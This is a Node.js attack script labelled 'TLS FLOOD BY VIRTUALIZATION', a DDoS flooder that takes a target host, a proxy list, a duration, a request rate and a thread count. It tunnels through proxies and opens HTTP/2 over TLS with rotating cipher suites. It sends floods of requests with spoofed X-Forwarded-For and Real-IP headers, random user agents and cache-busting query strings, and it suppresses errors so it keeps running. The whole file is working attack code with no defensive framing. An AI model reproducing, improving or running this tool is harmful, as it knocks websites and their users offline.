const url = require("url"), fs = require("fs"), http2 = require("http2"), http = require("http"), tls = require("tls"), net = require("net"), cluster = require("cluster"), colors = require("colors");
cplist = ["RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA", ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS:!RC4", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "EECDH+AESGCM:EDH+AESGCM:CHACHA20:!SHA1:!SHA256:!SHA384", "EECDH+AESGCM:EDH+AESGCM", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"], accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"], lang_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5"], encoding_header = ["deflate, gzip, br", "gzip", "deflate", "br"], control_header = ["no-cache", "max-age=0"], pathts = ["?s=", "/?", "", "?q=", "?true=", "?"], querys = ["", "&", "", "&&", "and", "=", "+", "?"], refers = ["https://www.google.com", "https://check-host.net", "https://www.facebook.com", "https://google.com", "https://youtube.com", "https://facebook.com"], browsers = ["Microsoft Edge", "Google Chrome", "Firefox", "Safari", "Opera", "Chrome Android", "Samsung Internet", "WebView Android"], sechuas = ["Android", "Chrome OS", "Chromium OS", "iOS", "Linux", "macOS", "Unknown", "Windows"], ignoreNames = ["RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError"], ignoreCodes = ["SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", "EPROTO"];
process.on("uncaughtException", function (myrielle) {
  if (myrielle.code && ignoreCodes.includes(myrielle.code) || myrielle.name && ignoreNames.includes(myrielle.name)) {
    return false;
  }
}).on("unhandledRejection", function (shalecia) {
  if (shalecia.code && ignoreCodes.includes(shalecia.code) || shalecia.name && ignoreNames.includes(shalecia.name)) {
    return false;
  }
}).on("warning", zakk => {
  if (zakk.code && ignoreCodes.includes(zakk.code) || zakk.name && ignoreNames.includes(zakk.name)) {
    return false;
  }
}).setMaxListeners(0);
const ip_spoof = () => {
  const capus = () => {
    return Math.floor(Math.random() * 255);
  };
  return `${""}${""}${""}${capus()}${""}${"."}${""}${capus()}${""}${"."}${""}${capus()}${""}${"."}${""}${capus()}${""}${""}${""}`;
};
function randstr(jahlissa) {
  var anum = "";
  var ronecia = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var canei = ronecia.length;
  for (var demirose = 0; demirose < jahlissa; demirose++) {
    anum += ronecia.charAt(Math.floor(Math.random() * canei));
  }
  ;
  return anum;
}
if (process.argv.length < 8) {
  console.log("	");
  console.log("		TLS FLOOD BY VIRTUALIZATION".green.bold);
  console.log("	");
  console.log("Usage: node STROM-BYPASS GET <host> http.txt 60 120 3");
  process.exit(0);
}
;
var rate = process.argv[6];
var method = process.argv[2];
var proxys = fs.readFileSync(process.argv[4], "utf-8").toString().replace(/\r/g, "").split("\n");
var fakeuas = fs.readFileSync("ua.txt", "utf-8").toString().replace(/\r/g, "").split("\n");
if (cluster.isMaster) {
  const dateObj = new Date;
  for (var bb = 0; bb < process.argv[7]; bb++) {
    cluster.fork();
  }
  ;
  console.log("TLS FLOOD BY VIRTUALIZATION".red.bold);
  setTimeout(() => {
    console.log("Attack ended.".green.bold);
    process.exit(-1);
  }, process.argv[5] * 1e3);
} else {
  function flood() {
    var jonan = url.parse(process.argv[3]);
    var anjum = fakeuas[Math.floor(Math.random() * fakeuas.length)];
    const lyal = ip_spoof();
    var malaysha = querys[Math.floor(Math.random() * querys.length)];
    var malford = refers[Math.floor(Math.random() * refers.length)];
    var xamora = cplist[Math.floor(Math.random() * cplist.length)];
    var via = proxys[Math.floor(Math.random() * proxys.length)].split(":");
    var cullus = {":method": method, ":path": jonan.path + pathts[Math.floor(Math.random() * pathts.length)] + randstr(15) + malaysha + randstr(15), ":scheme": "https", Origin: jonan.host, Accept: accept_header[Math.floor(Math.random() * accept_header.length)], "Accept-encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)], "Accept-Language": lang_header[Math.floor(Math.random() * lang_header.length)], "Cache-Control": control_header[Math.floor(Math.random() * control_header.length)], DNT: "1", "Sec-ch-ua": browsers[Math.floor(Math.random() * browsers.length)] + ";v=105,Not;A Brand;v=99,Chromium;v=105", "sec-ch-ua-platform": sechuas[Math.floor(Math.random() * sechuas.length)], "X-Frame-Options": "DENY", "X-Content-Type-Options": "nosniff", "X-XSS-Protection": "1; mode=block", "sec-fetch-dest": "document", "sec-fetch-mode": "navigate", "sec-fetch-site": "none", "sec-fetch-user": "?1", "sec-gpc": "1", TE: "trailers", Trailer: "Max-Forwards", Pragma: "client-x-cache-on, client-x-cache-remote-on, client-x-check-cacheable, client-x-get-cache-key, client-x-get-extracted-values, client-x-get-ssl-client-session-id, client-x-get-true-cache-key, client-x-serial-no, client-x-get-request-id,client-x-get-nonces,client-x-get-client-ip,client-x-feo-trace", "Upgrade-Insecure-Requests": "1", "X-Forwarded-Proto": "HTTP", "X-Forwarded-For": lyal, "X-Forwarded-Host": lyal, Via: lyal, "Client-IP": lyal, "Real-IP": lyal, Referer: malford, "User-agent": anjum};
    const madylynn = new http.Agent({keepAlive: true, keepAliveMsecs: 5e4, maxSockets: 128});
    var amythest = http.request({host: via[0], agent: madylynn, globalAgent: madylynn, port: via[1], timeout: 1e4, ciphers: xamora, headers: {Host: jonan.host, "Proxy-Connection": "Keep-Alive", Connection: "Keep-Alive"}, method: "CONNECT", path: jonan.host + ":443"}, function () {
      amythest.setSocketKeepAlive(true);
    });
    amythest.on("connect", function (ymelda, zamarien, jenera) {
      const minesh = http2.connect(jonan.href, {createConnection: () => {
        return tls.connect({host: jonan.host, ciphers: tls.getCiphers().join(":") + xamora, secureProtocol: "TLS_method", servername: jonan.host, uri: jonan.host, curve: "GREASE:X25519:x25519", clientTimeout: 5e3, clientmaxTimeout: 1e4, challengesToSolve: 10, resolveWithFullResponse: true, HonorCipherOrder: true, Compression: false, UseStapling: true, SessionTickets: false, requestCert: true, gzip: true, port: 443, sigals: "rsa_pss_rsae_sha256", strictSSL: false, secure: true, rejectUnauthorized: false, ALPNProtocols: ["h2"], socket: zamarien}, function () {
          for (let javonne = 0; javonne < rate; javonne++) {
            const mohsin = minesh.request(cullus);
            mohsin.setEncoding("utf8");
            mohsin.on("data", kierah => {
              delete kierah;
            });
            mohsin.on("response", () => {
              mohsin.close();
            });
            mohsin.end();
          }
        });
      }});
    });
    amythest.end();
  }
  setInterval(() => {
    flood();
  });
}
